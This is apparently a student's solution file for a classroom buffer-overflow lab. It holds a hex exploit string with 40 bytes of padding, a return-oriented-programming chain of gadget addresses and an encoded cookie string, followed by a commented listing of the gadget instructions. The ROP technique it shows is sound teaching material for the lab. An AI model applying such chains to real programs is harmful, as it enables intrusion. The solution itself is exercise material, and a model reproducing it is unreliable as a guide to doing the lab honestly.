41 42 43 44 45 46 47 48 49 50
41 42 43 44 45 46 47 48 49 50
41 42 43 44 45 46 47 48 49 50
41 42 43 44 45 46 47 48 49 50 /* 刚好40个字节 */
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
/* 
movq %rsp, %rax
movq %rax, %rdi
popq %rax
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi
lea (%rdi, %rsi, 1),%rax  # %rsi存的是偏移，%rdi存的是rsp2的位置
*/